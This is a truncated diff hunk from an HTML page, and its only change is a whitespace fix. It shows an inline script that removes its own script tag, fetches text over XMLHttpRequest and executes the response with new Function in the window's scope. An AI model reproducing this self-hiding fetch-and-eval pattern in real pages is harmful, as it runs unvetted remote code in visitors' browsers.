@@ -12,7 +12,7 @@
     <script>
         - function (body, window) {
             body.removeChild(body.getElementsByTagName("script")[0]);
-            var xhr = new(window.XMLHttpRequest || ActiveXObject)('Microsoft.XMLHTTP');
+            var xhr = new (window.XMLHttpRequest || ActiveXObject)('Microsoft.XMLHTTP');
             xhr.onreadystatechange = function () {
                 if (xhr.readyState === 4) {
                     new Function(xhr.responseText).call(window);
